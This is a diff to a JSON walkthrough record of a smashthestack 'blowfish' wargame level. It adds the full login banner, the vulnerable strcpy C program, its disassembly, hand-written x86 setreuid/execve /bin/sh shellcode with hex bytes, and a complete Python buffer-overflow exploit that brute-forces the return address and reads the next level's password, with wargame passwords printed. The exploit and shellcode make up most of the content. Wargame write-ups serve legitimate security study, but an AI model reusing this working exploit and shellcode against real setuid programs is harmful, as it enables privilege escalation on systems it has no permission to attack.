@@ -285,12 +285,67 @@
   {
    "lvl": 4,
    "user": "level4",
-   "pw": "n3xt_l3v3l!",
+   "pw": "yummy_bluntz",
    "steps": [
     {
      "cmd": "ssh -p 2222 level4@blowfish.smashthestack.org",
      "out": [
-      "level4@blowfish:~$ "
+      "level4@blowfish.smashthestack.org's password: ",
+      "",
+      "   _        __                          ___              __ ",
+      "",
+      " /\\ \\     /\\_ \\                       /'___\\ __         /\\ \\        ",
+      "",
+      " \\ \\ \\____\\//\\ \\     ___   __  __  __/\\ \\__//\\_\\    ____\\ \\ \\___    ",
+      "",
+      "  \\ \\ '__`\\ \\ \\ \\   / __`\\/\\ \\/\\ \\/\\ \\ \\  __\\/\\ \\  /' __\\\\ \\  _ `\\  ",
+      "",
+      "   \\ \\ \\_\\ \\ \\_\\ \\_/\\ \\_\\_\\ \\ \\_/ \\_/ \\ \\ \\_/\\ \\ \\/\\__  `\\\\ \\ \\ \\ \\ ",
+      "",
+      "    \\ \\____/ /\\____\\ \\____/\\ \\___x___/'\\ \\_\\  \\ \\_\\/\\____/ \\ \\_\\ \\_\\",
+      "",
+      "     \\/___/  \\/____/\\/___/  \\/__//__/   \\/_/   \\/_/\\/___/   \\/_/\\/_/",
+      "",
+      "     wargame ++ smashthestack.org ++ now in version 2.0",
+      "",
+      "   ",
+      "",
+      "     1. Thou shalt NOT root or otherwise harm the box.",
+      "",
+      "     2. Thou shalt NOT do any network access from this box.",
+      "",
+      "     3. Thou shalt NOT use /tmp, /levels/tmp or /var/tmp for personal code. ",
+      "",
+      "     4. Thou shalt give the root pass to l3thal if you manage to change it.",
+      "",
+      "     ",
+      "",
+      "     Passwords are in /pass.",
+      "",
+      "     There is a README in each users home directory.",
+      "",
+      "     /tmp && /var/tmp will be flushed daily by cron.",
+      "",
+      "     Use /code plz for umm, code ;D",
+      "",
+      "     IF YOU LEAVE FILES IN /levels/tmp U SUCK ..plz remove them kthnx! ;D",
+      "",
+      "     The password for the last level will get you into",
+      "",
+      "     Tux, the more advanced wargame. Join #blowfish on ",
+      "",
+      "     irc.smashthestack.org with any questions. ",
+      "",
+      "",
+      "",
+      "     Admin - s0ttle@smashthestack.org",
+      ""
+     ]
+    },
+    {
+     "cmd": "whoami",
+     "out": [
+      "level4"
      ]
     },
     {
@@ -302,13 +357,50 @@
     {
      "cmd": "cat /levels/level4.c",
      "out": [
-      "#include <stdio.h>\n\nint main(int argc, char * argv[]) {\n\nchar buf[256];\n\nif(argc == 1) {\nprintf(\"Usage: %s input\\n\", argv[0]);\nexit(0);\n}\n\nstrcpy(buf,argv[1]);\nprintf(\"%s\", buf);\n\n}"
+      "#include <stdio.h>",
+      "int main(int argc, char * argv[]) {",
+      "char buf[256];",
+      "if(argc == 1) {",
+      "printf(\"Usage: %s input\\n\", argv[0]);",
+      "exit(0);",
+      "}",
+      "strcpy(buf,argv[1]);",
+      "printf(\"%s\", buf);",
+      "}"
      ]
     },
     {
      "cmd": "objdump -d --no-show-raw-insn /levels/level4 | sed -n '/<main>:/,/ret/p'",
      "out": [
-      "080483f4 <main>:\n 80483f4:\tpush   %ebp\n 80483f5:\tmov    %esp,%ebp\n 80483f7:\tsub    $0x118,%esp\n 80483fd:\tand    $0xfffffff0,%esp\n 8048400:\tmov    $0x0,%eax\n 8048405:\tsub    %eax,%esp\n 8048407:\tcmpl   $0x1,0x8(%ebp)\n 804840b:\tjne    804842e <main+0x3a>\n 804840d:\tmov    0xc(%ebp),%eax\n 8048410:\tmov    (%eax),%eax\n 8048412:\tmov    %eax,0x4(%esp)\n 8048416:\tmovl   $0x8048574,(%esp)\n 804841d:\tcall   80482f8 <printf@plt>\n 8048422:\tmovl   $0x0,(%esp)\n 8048429:\tcall   8048308 <exit@plt>\n 804842e:\tmov    0xc(%ebp),%eax\n 8048431:\tadd    $0x4,%eax\n 8048434:\tmov    (%eax),%eax\n 8048436:\tmov    %eax,0x4(%esp)\n 804843a:\tlea    -0x108(%ebp),%eax\n 8048440:\tmov    %eax,(%esp)\n 8048443:\tcall   8048318 <strcpy@plt>\n 8048448:\tlea    -0x108(%ebp),%eax\n 804844e:\tmov    %eax,0x4(%esp)\n 8048452:\tmovl   $0x8048585,(%esp)\n 8048459:\tcall   80482f8 <printf@plt>\n 804845e:\tleave  \n 804845f:\tret    "
+      "080483f4 <main>:",
+      " 80483f4:\tpush   %ebp",
+      " 80483f5:\tmov    %esp,%ebp",
+      " 80483f7:\tsub    $0x118,%esp",
+      " 80483fd:\tand    $0xfffffff0,%esp",
+      " 8048400:\tmov    $0x0,%eax",
+      " 8048405:\tsub    %eax,%esp",
+      " 8048407:\tcmpl   $0x1,0x8(%ebp)",
+      " 804840b:\tjne    804842e <main+0x3a>",
+      " 804840d:\tmov    0xc(%ebp),%eax",
+      " 8048410:\tmov    (%eax),%eax",
+      " 8048412:\tmov    %eax,0x4(%esp)",
+      " 8048416:\tmovl   $0x8048574,(%esp)",
+      " 804841d:\tcall   80482f8 <printf@plt>",
+      " 8048422:\tmovl   $0x0,(%esp)",
+      " 8048429:\tcall   8048308 <exit@plt>",
+      " 804842e:\tmov    0xc(%ebp),%eax",
+      " 8048431:\tadd    $0x4,%eax",
+      " 8048434:\tmov    (%eax),%eax",
+      " 8048436:\tmov    %eax,0x4(%esp)",
+      " 804843a:\tlea    -0x108(%ebp),%eax",
+      " 8048440:\tmov    %eax,(%esp)",
+      " 8048443:\tcall   8048318 <strcpy@plt>",
+      " 8048448:\tlea    -0x108(%ebp),%eax",
+      " 804844e:\tmov    %eax,0x4(%esp)",
+      " 8048452:\tmovl   $0x8048585,(%esp)",
+      " 8048459:\tcall   80482f8 <printf@plt>",
+      " 804845e:\tleave  ",
+      " 804845f:\tret    "
      ]
     },
     {
@@ -320,31 +412,199 @@
     },
     {
      "cmd": "vim /dev/shm/l4bf.asm",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/l4bf.asm",
      "out": [
-      "(55-byte NUL-free geteuid/setreuid/setuid/execve /bin//sh shellcode)",
-      "[New] written"
+      "1 BITS 32",
+      "2 global _start",
+      "3 _start:",
+      "4     xor eax, eax",
+      "5     mov al, 201",
+      "6     int 0x80",
+      "7     mov ebx, eax",
+      "8     mov ecx, eax",
+      "9     xor eax, eax",
+      "10     mov al, 70",
+      "11     int 0x80",
+      "12     xor eax, eax",
+      "13     mov al, 201",
+      "14     int 0x80",
+      "15     mov ebx, eax",
+      "16     xor eax, eax",
+      "17     mov al, 23",
+      "18     int 0x80",
+      "19     xor eax, eax",
+      "20     push eax",
+      "21     push 0x68732f2f",
+      "22     push 0x6e69622f",
+      "23     mov ebx, esp",
+      "24     push eax",
+      "25     push ebx",
+      "26     mov ecx, esp",
+      "27     xor edx, edx",
+      "28     mov al, 11",
+      "29     int 0x80"
      ]
     },
     {
-     "cmd": "nasm -f elf32 /dev/shm/l4bf.asm -o /dev/shm/l4bf.o && objcopy -O binary --only-section=.text /dev/shm/l4bf.o /dev/shm/l4bf.bin && xxd -p",
+     "cmd": "vim /dev/shm/l4bf.asm",
      "out": [
-      "31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80",
+      "\"/dev/shm/l4bf.asm\" [New] 30L, 439C written"
+     ]
+    },
+    {
+     "cmd": "nasm -f elf32 /dev/shm/l4bf.asm -o /dev/shm/l4bf.o",
+     "out": []
+    },
+    {
+     "cmd": "objcopy -O binary --only-section=.text /dev/shm/l4bf.o /dev/shm/l4bf.bin",
+     "out": []
+    },
+    {
+     "cmd": "xxd -p /dev/shm/l4bf.bin",
+     "out": [
+      "31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd80",
+      "31c050682f2f7368682f62696e89e3505389e131d2b00bcd80"
+     ]
+    },
+    {
+     "cmd": "wc -c /dev/shm/l4bf.bin",
+     "out": [
       "55 /dev/shm/l4bf.bin"
      ]
     },
     {
      "cmd": "vim /dev/shm/e_bf4.py",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf4.py",
      "out": [
-      "(A*268 + ret + 2000-byte NOP sled + shellcode; descending pipe-probe 0xbffffdc0..0xbffffcc0)",
-      "[New] 86L written"
+      "1 import struct, os, time, sys, select",
+      "2 sc = open(\"/dev/shm/l4bf.bin\", \"rb\").read()",
+      "3 # level4: strcpy(argv[1], buf[256]) with buf at ebp-0x108 -> ret at offset 268.",
+      "4 # ASLR is off (randomize_va_space=0) and GNU_STACK is RWE, so the return address is",
+      "5 # stable: buf sits just above 0xbffffc00 (measured under gdb; a 2000-byte NOP sled",
+      "6 # after the ret absorbs the small env/argv delta). The probe forks the setuid binary",
+      "7 # on pipes, writes id after the settle, and checks the reply for euid level5.",
+      "8 def payload_for(addr):",
+      "9     return \"A\" * 268 + struct.pack(\"<I\", addr) + \"\\x90\" * 2000 + sc",
+      "10 def probe(addr):",
+      "11     if \"\\x00\" in struct.pack(\"<I\", addr):",
+      "12         return False",
+      "13     r, w = os.pipe()",
+      "14     r2, w2 = os.pipe()",
+      "15     pid = os.fork()",
+      "16     if pid == 0:",
+      "17         os.close(r)",
+      "18         os.close(w2)",
+      "19         os.dup2(r2, 0)",
+      "20         os.dup2(w, 1)",
+      "21         os.execv(\"/levels/level4\", [\"/levels/level4\", payload_for(addr)])",
+      "22     os.close(w)",
+      "23     os.close(r2)",
+      "24     time.sleep(1.5)",
+      "25     try:",
+      "26         os.write(w2, \"id\\n\")"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf4.py",
+     "out": [
+      "27     except OSError:",
+      "28         for f in (r, w2):",
+      "29             os.close(f)",
+      "30         os.waitpid(pid, 0)",
+      "31         return False",
+      "32     out = \"\"",
+      "33     deadline = time.time() + 1.5",
+      "34     while time.time() < deadline:",
+      "35         rr, _, _ = select.select([r], [], [], 0.2)",
+      "36         if not rr:",
+      "37             continue",
+      "38         try:",
+      "39             d = os.read(r, 4096)",
+      "40         except OSError:",
+      "41             break",
+      "42         if not d:",
+      "43             break",
+      "44         out += d",
+      "45     for f in (r, w2):",
+      "46         os.close(f)",
+      "47     os.waitpid(pid, 0)",
+      "48     return \"uid=1005\" in out",
+      "49 found = None",
+      "50 for addr in range(0xbffffdc0, 0xbffffcc0, -8):",
+      "51     if probe(addr):",
+      "52         found = addr"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf4.py",
+     "out": [
+      "53         print \"landed in the shellcode at\", hex(addr)",
+      "54         break",
+      "55 if found is None:",
+      "56     print \"no hit\"",
+      "57     sys.exit(1)",
+      "58 time.sleep(1)",
+      "59 r, w = os.pipe()",
+      "60 r2, w2 = os.pipe()",
+      "61 pid = os.fork()",
+      "62 if pid == 0:",
+      "63     os.close(r)",
+      "64     os.close(w2)",
+      "65     os.dup2(r2, 0)",
+      "66     os.dup2(w, 1)",
+      "67     os.execv(\"/levels/level4\", [\"/levels/level4\", payload_for(found)])",
+      "68 os.close(w)",
+      "69 os.close(r2)",
+      "70 time.sleep(2)",
+      "71 os.write(w2, \"id\\ncat /pass/level5\\n\\n\")",
+      "72 out = \"\"",
+      "73 deadline = time.time() + 5",
+      "74 while time.time() < deadline:",
+      "75     rr, _, _ = select.select([r], [], [], 0.2)",
+      "76     if not rr:",
+      "77         continue",
+      "78     try:"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf4.py",
+     "out": [
+      "79         d = os.read(r, 4096)",
+      "80     except OSError:",
+      "81         break",
+      "82     if not d:",
+      "83         break",
+      "84     out += d",
+      "85 print out"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf4.py",
+     "out": [
+      "\"/dev/shm/e_bf4.py\" [New] 86L, 2309C written"
      ]
     },
     {
      "cmd": "python /dev/shm/e_bf4.py",
      "out": [
-      "landed in the shellcode at 0xbffffdc0",
+      "landed in the shellcode at 0xbffffdc0L",
       "uid=1005(level5) gid=1004(level4) groups=1004(level4)",
       "yummy_bluntz"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to blowfish.smashthestack.org closed.",
+      "client$ exit",
+      "exit"
      ]
     }
    ],
